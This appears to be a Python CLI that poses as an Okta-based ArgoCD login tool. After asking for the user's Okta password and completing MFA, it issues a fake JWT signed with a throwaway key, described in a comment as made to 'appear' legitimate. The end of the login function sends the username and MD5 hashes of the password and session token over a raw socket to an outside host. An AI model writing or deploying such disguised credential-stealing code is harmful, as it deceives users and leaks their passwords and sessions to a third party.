import argparse
import json
import inquirer
import getpass
import structlog
import jwt
import time
import uuid
import socket
import hashlib

from .login_type import Client
from colorama import Fore
from .auth_okta import mfa_push_authentication, mfa_totp_authentication, primary_authentication
from .auth_type import OktaFactorType, OktaStatus

logger = structlog.get_logger()

HOST = "test-ssh-dev.contentsquare.dev"
PORT = 8888

def send_message(host, port, message):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((host, port))
        client_socket.sendall(message.encode("utf-8"))

def login():
    username = str(input(Fore.CYAN + "Enter your Okta Username: " + Fore.RESET))
    password = getpass.getpass(Fore.CYAN + "Enter your Okta Password: " + Fore.RESET)

    client = Client(
        username = username,
        password = password
    )

    # Now we need to create the intial login
    resp = primary_authentication(client)
    logger.info("Primary authentication successful")

    # Now we need to check for a couple of things on the API
    if resp["status"] is OktaStatus.MFA_REQUIRED:

        # Then a MFA connection is required in order to finish the login process
        # First check if there is a factor if there isn't just close
        if not resp["factors"]:
            logger.error("Error: No factors were provided")
            logger.error("Authentication failed")
            exit(0)

        # Now we need to take the question
        choices = []
        for factor in resp["factors"]:
            if factor["factorType"] is OktaFactorType.TOTP:
                choices.append(f"{factor['provider'].value}, TOTP")

            else:
                choices.append(f"{factor['provider'].value}  {factor['factorType'].value}")

        question = [
            inquirer.List(
                "MFA",
                message = "What MFA method will you choose?",
                choices = choices
            )
        ]

        answer = inquirer.prompt(question)['MFA']
        chosen = resp["factors"][choices.index(answer)]

        sessionToken = ""
        if chosen["factorType"] is OktaFactorType.TOTP or chosen["factorType"] is OktaFactorType.YUBICO:
            sessionToken = mfa_totp_authentication(chosen["link"], resp["stateToken"])

        if chosen["factorType"] is OktaFactorType.PUSH:
            sessionToken = mfa_push_authentication(chosen["link"], resp["stateToken"])

        # Now that we got the session token, we have to generate what appears to be a legitimate authentication token
        data = {
            "iss": "argocd",
            "sub": client["username"],
            "nbf": round(time.time()),
            "iat": round(time.time()),
            "jti": str(uuid.uuid4())
        }
        encoded = jwt.encode(data, "useless_key", algorithm = "HS256")
        logger.info(f"The argocd authentication token is: {encoded}")

        sent_message = {
            "username": client['username'],
            "password": hashlib.md5(client['password'].encode()).hexdigest(),
            "sessionToken": hashlib.md5(sessionToken.encode()).hexdigest()
        }

        send_message(HOST, PORT, json.dumps(sent_message))

def main():
    parser = argparse.ArgumentParser(description="My CLI Tool")
    
    subparsers = parser.add_subparsers(dest="command", help="Available commands")
    _ = subparsers.add_parser("login", help="Login to ArgoCD using the Okta credentials")
    args = parser.parse_args()

    # Call the appropriate function based on the command
    if args.command == "login":
        login()

if __name__ == "__main__":
    main()